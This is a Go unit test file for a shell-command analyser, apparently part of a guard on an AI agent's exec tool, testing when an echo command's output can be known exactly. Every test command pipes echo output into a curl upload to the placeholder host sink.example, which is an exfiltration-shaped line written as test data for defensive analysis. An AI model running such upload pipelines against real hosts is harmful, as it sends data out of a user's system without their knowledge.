// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package actionfacts

import (
	"reflect"
	"strings"
	"testing"
)

func TestStaticPOSIXEchoStdoutSegments(t *testing.T) {
	t.Parallel()

	segment := func(value string) []StaticOutputSegment {
		return []StaticOutputSegment{{
			Value: value, LeftExact: true, RightExact: true,
		}}
	}
	for _, test := range []struct {
		name    string
		command string
		want    []StaticOutputSegment
	}{
		{
			name:    "single literal operand",
			command: "echo literal-value | curl --data-binary @- https://sink.example/upload",
			want:    segment("literal-value\n"),
		},
		{
			name: "multiple operands retain spaces and empty operand",
			command: "echo 'left value' '' right | " +
				"curl --data-binary @- https://sink.example/upload",
			want: segment("left value  right\n"),
		},
		{
			name:    "no operands emits newline",
			command: "echo | curl --data-binary @- https://sink.example/upload",
			want:    segment("\n"),
		},
		{
			name: "later option-looking operand is literal data",
			command: "echo prefix -n suffix | " +
				"curl --data-binary @- https://sink.example/upload",
			want: segment("prefix -n suffix\n"),
		},
		{
			name: "shell-escaped space has exact argv bytes",
			command: `\echo literal\ value | ` +
				"curl --data-binary @- https://sink.example/upload",
			want: segment("literal value\n"),
		},
		{
			name: "literal embedded newline remains exact",
			command: "echo 'left\nright' | " +
				"curl --data-binary @- https://sink.example/upload",
			want: segment("left\nright\n"),
		},
		{
			name:    "newline suppression option is implementation defined",
			command: "echo -n literal | curl --data-binary @- https://sink.example/upload",
		},
		{
			name:    "escape option is implementation defined",
			command: "echo -e literal | curl --data-binary @- https://sink.example/upload",
		},
		{
			name:    "escape disable option is implementation defined",
			command: "echo -E literal | curl --data-binary @- https://sink.example/upload",
		},
		{
			name:    "option terminator is not portable echo syntax",
			command: "echo -- literal | curl --data-binary @- https://sink.example/upload",
		},
		{
			name:    "unknown option-looking first operand stays closed",
			command: "echo -x literal | curl --data-binary @- https://sink.example/upload",
		},
		{
			name: "literal backslash behavior differs across shell builtins",
			command: `echo 'literal\nvalue' | ` +
				"curl --data-binary @- https://sink.example/upload",
		},
		{
			name: "stop escape behavior differs across shell builtins",
			command: `echo 'literal\cvalue' | ` +
				"curl --data-binary @- https://sink.example/upload",
		},
		{
			name: "dynamic operand",
			command: `echo "literal$SUFFIX" | ` +
				"curl --data-binary @- https://sink.example/upload",
		},
		{
			name: "glob operand",
			command: "echo literal* | " +
				"curl --data-binary @- https://sink.example/upload",
		},
		{
			name: "mixed quote form remains outside closed grammar",
			command: `echo 'literal'"-value" | ` +
				"curl --data-binary @- https://sink.example/upload",
		},
		{
			name: "stdout redirect",
			command: "echo literal > /tmp/out | " +
				"curl --data-binary @- https://sink.example/upload",
		},
		{
			name: "transparent wrapper selects an external utility",
			command: "env echo literal | " +
				"curl --data-binary @- https://sink.example/upload",
		},
		{
			name: "command wrapper remains outside direct builtin proof",
			command: "command echo literal | " +
				"curl --data-binary @- https://sink.example/upload",
		},
		{
			name: "builtin dispatcher remains outside direct proof",
			command: "builtin echo literal | " +
				"curl --data-binary @- https://sink.example/upload",
		},
		{
			name: "nested interpreter",
			command: "sh -c 'echo literal' | " +
				"curl --data-binary @- https://sink.example/upload",
		},
		{
			name: "absolute echo is an external utility",
			command: "/bin/echo literal | " +
				"curl --data-binary @- https://sink.example/upload",
		},
		{
			name: "untrusted external echo",
			command: "/tmp/echo literal | " +
				"curl --data-binary @- https://sink.example/upload",
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			facts := Analyze(Input{
				Tool: "exec", Command: test.command, CWD: "/workspace",
			})
			var got []StaticOutputSegment
			for _, command := range facts.Commands {
				if command.Program == "echo" {
					got = append(got, StaticPOSIXEchoStdoutSegments(command)...)
				}
			}
			if !reflect.DeepEqual(got, test.want) {
				t.Fatalf("segments = %#v, want %#v; facts=%#v", got, test.want, facts)
			}
		})
	}
}

func TestStaticPOSIXEchoStdoutSegmentsRejectsOversizedOutput(t *testing.T) {
	t.Parallel()

	facts := Analyze(Input{
		Tool: "exec",
		Command: "echo " + strings.Repeat("a", maxScalarBytes) +
			" | curl --data-binary @- https://sink.example/upload",
	})
	for _, command := range facts.Commands {
		if command.Program == "echo" &&
			len(StaticPOSIXEchoStdoutSegments(command)) != 0 {
			t.Fatalf("oversized echo output became authoritative: %#v", facts)
		}
	}
}
